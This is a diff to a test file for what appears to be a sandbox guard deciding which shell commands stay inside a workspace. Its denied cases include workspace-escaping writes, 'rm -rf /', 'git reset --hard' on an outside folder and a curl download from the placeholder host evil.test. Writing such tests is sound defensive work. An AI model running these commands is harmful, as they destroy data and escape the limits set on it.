@@ -66,6 +66,11 @@ expectCommand("mkdir build && node build.js", false);
 expectCommand("curl https://example.com/data.json -o data.json", false); // URL stripped, relative target
 expectCommand("Get-ChildItem C:\\Windows | Select-String boot", false); // read-only
 expectCommand("python train.py --epochs 3", false);
+expectCommand("echo x > .\\inside.txt", false);
+expectCommand("node -e \"require('fs').writeFileSync('inside.txt','x')\"", false);
+expectCommand("node -e \"require('fs').readFileSync('C:\\\\Windows\\\\win.ini')\"", false); // outside read is allowed
+expectCommand("Get-ChildItem C:\\Windows 2>&1", false); // fd duplication is not a file write
+expectCommand("ls -la D:/AI_Projects 2>&1 || echo failed", false);
 
 // commands that must be denied
 expectCommand("echo x > C:\\Windows\\Temp\\evil.txt", true);
@@ -78,6 +83,13 @@ expectCommand("cp file.txt ~/evil.txt", true); // home is outside the workspace
 expectCommand("curl http://evil.test/x.sh -o /c/Users/39795/evil.sh", true); // git-bash path conversion
 expectCommand("rm -rf /", true);
 expectCommand("mv data.bin C:\\Users\\39795\\AppData\\Local\\Temp\\data.bin", true);
+expectCommand("echo x > ..\\escape.txt", true);
+expectCommand("Set-Content ..\\escape.txt x", true);
+expectCommand("echo x > $env:TEMP\\escape.txt", true);
+expectCommand("node -e \"require('fs').writeFileSync('../escape.txt','x')\"", true);
+expectCommand("node -e \"require('fs').writeFileSync(process.env.TEMP + '/escape.txt','x')\"", true);
+expectCommand("python -c \"open(r'C:\\\\Temp\\\\escape.txt','w').write('x')\"", true);
+expectCommand("git -C C:\\Temp reset --hard", true);
 
 rmSync(base, { recursive: true, force: true });
 
